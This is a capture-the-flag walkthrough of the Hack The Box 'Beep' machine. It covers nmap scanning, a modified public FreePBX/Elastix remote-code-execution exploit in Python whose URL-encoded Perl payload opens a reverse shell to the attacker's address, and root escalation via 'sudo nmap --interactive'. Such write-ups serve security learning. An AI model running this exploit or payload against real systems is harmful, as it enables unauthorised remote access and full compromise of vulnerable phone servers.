![[Pasted image 20240720104740.png]]

**Ping** 
![[Pasted image 20240616222303.png]]

Nmap Default Scan
```
nmap 10.10.10.7 -oN dnmap
```
![[Pasted image 20240616222340.png]]

Nmap Script and Service Scan
```
nmap 10.10.10.7 -sC -sV -A -oN snmap
```
![[Pasted image 20240616224344.png]]
![[Pasted image 20240616224406.png]]


Nmap All Port Scan
```
nmap -p- --min-rate 10000 10.10.10.7 -oN anmap
```
![[Pasted image 20240616232744.png]]

on port 80
![[Pasted image 20240616232808.png]]
Redirected to port 443.

Look's like we have a public exploit for this...!

Found public exploit
https://github.com/infosecjunky/FreePBX-2.10.0---Elastix-2.2.0---Remote-Code-Execution?source=post_page-----51abeb89846c--------------------------------
![[Pasted image 20240616232931.png]]

Need Some modification,
Modified code
```
import urllib.request
import ssl

rhost="10.10.10.7"
lhost="10.10.14.2"
lport=4444
extension="233"


ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

# Reverse shell payload

url = 'https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c&callmenum='+str(extension)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22'+str(lhost)+'%3a'+str(lport)+'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'

urllib.request.urlopen(url,context=ctx)

# On Elastix, once we have a shell, we can escalate to root:
# root@bt:~# nc -lvp 443
# listening on [any] 443 ...
# connect to [172.16.254.223] from voip [172.16.254.72] 43415
# id
# uid=100(asterisk) gid=101(asterisk)
# sudo nmap --interactive

# Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
# Welcome to Interactive Mode -- press h <enter> for help
# nmap> !sh
# id
# uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
```
Also, we have steps to privilege escalation as well.

Will run the code
```
python3 exp.py
```
![[Pasted image 20240616233150.png]]

Got reverse shell
![[Pasted image 20240616233214.png]]

Will jump to Privilege Escalation....!


As we know the steps from the public exploit, will follow that
```
sudo nmap --interactive
```
```
!sh
```
![[Pasted image 20240616233406.png]]

Will get the flags
root.txt
![[Pasted image 20240616233447.png]]

user.txt
![[Pasted image 20240616233540.png]]


I'm done with beeeep......:)